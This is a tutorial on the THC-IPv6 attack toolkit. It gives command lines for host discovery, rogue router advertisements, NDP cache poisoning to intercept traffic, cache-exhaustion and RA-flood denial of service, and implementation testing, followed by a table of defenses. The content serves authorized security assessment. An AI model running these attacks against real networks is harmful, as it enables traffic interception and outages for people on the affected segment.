# How to Use THC-IPv6 Toolkit for Security Testing

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: THC-IPv6, IPv6, Security Testing, Network Tools, Reconnaissance, Fuzzing

Description: A guide to using the THC-IPv6 toolkit for IPv6 security assessment, including host discovery, NDP attacks, and protocol fuzzing in authorized lab environments.

The THC-IPv6 toolkit (The Hacker's Choice IPv6 Attack Toolkit) is one of the earliest and most comprehensive IPv6 security testing toolkits. It includes over 20 tools for host discovery, NDP manipulation, Router Advertisement attacks, and IPv6 protocol fuzzing. Use only in authorized environments.

**Warning**: All tools in this guide must only be used in authorized lab environments.

## Installing THC-IPv6

```bash
# Debian/Ubuntu

sudo apt-get install thc-ipv6

# From source
sudo apt-get install build-essential libpcap-dev libssl-dev libnetfilter-queue-dev
git clone https://github.com/vanhauser-thc/thc-ipv6.git
cd thc-ipv6
make
sudo make install
```

On Debian/Ubuntu packages, the tool names are prefixed with `atk6-` (for example, `atk6-alive6`). Source builds install the upstream names used in the examples below.

## Key THC-IPv6 Tools

| Tool | Purpose |
|---|---|
| alive6 | Discover live IPv6 hosts |
| thcping6 | IPv6 ping with options |
| flood_router6 | RA flood attack |
| flood_advertise6 | NA flood attack |
| fake_router6 | Rogue Router Advertisement |
| fake_mldrouter6 | Fake MLD router |
| ndpexhaust26 | Exhaust NDP cache |
| parasite6 | NDP cache poisoning |
| redir6 | Redirect attack |
| detect-new-ip6 | Monitor for new IPv6 addresses |
| implementation6 | IPv6 implementation checks |

## Host Discovery with alive6

```bash
# Discover live hosts on the local link
sudo alive6 eth0

# Discover common addresses in a specific prefix
sudo alive6 -C eth0 2001:db8::/64

# Use multiple probe types
sudo alive6 -F eth0
```

## Rogue Router Advertisement with fake_router6 and fake_router26

```bash
# Announce a fake default router and prefix
sudo fake_router6 eth0 2001:db8:1::/64

# Announce with a DNS server option
sudo fake_router6 eth0 2001:db8:1::/64 2001:db8::53

# Announce with a specific router lifetime
sudo fake_router26 -A 2001:db8:1::/64 -l 200 eth0
```

## NDP Cache Poisoning with parasite6

```bash
# Poison NDP cache to become MITM for local hosts
sudo parasite6 eth0

# Specify a fake MAC address
sudo parasite6 eth0 02:00:00:00:00:01

# Enable IP forwarding before using parasite6 (MITM mode)
sudo sysctl -w net.ipv6.conf.eth0.forwarding=1
sudo parasite6 eth0
```

## NDP Cache Exhaustion with ndpexhaust26

IPv6 routers maintain neighbor caches. Exhausting the cache causes denial of service:

```bash
# Flood the target /64 network
sudo ndpexhaust26 eth0 2001:db8::/64

# Use ICMPv6 Echo Requests instead of the default Too Big messages
sudo ndpexhaust26 -p eth0 2001:db8::/64
```

## Router Advertisement Flooding with flood_router6

```bash
# Flood with router advertisements (disrupt IPv6 default routes)
sudo flood_router6 eth0

# Add a Hop-by-Hop header while flooding
sudo flood_router6 -H eth0
```

## Implementation Checks with implementation6

```bash
# Check IPv6 implementation of target host
sudo implementation6 eth0 2001:db8::10

# Run a specific implementation test case
sudo implementation6 eth0 2001:db8::10 1

# Skip initial and final alive checks
sudo implementation6 -p eth0 2001:db8::10
```

## Monitoring for New IPv6 Addresses

```bash
# Alert when new IPv6 addresses appear on segment
sudo detect-new-ip6 eth0

# Log new addresses to file
sudo detect-new-ip6 eth0 | tee new-ipv6-addresses.log
```

## Defenses Against THC-IPv6 Attacks

| Attack | Defense |
|---|---|
| fake_router6 | RA Guard on switches |
| parasite6 | NDPMon, SEND |
| ndpexhaust26 | NDP queue/cache limits on routers |
| flood_router6 | RA rate limiting |
| implementation6 | Patch OS to latest version |

The THC-IPv6 toolkit provides a broad set of attack primitives that help identify IPv6 implementation weaknesses before real attackers do, making it a valuable part of any authorized IPv6 security assessment.
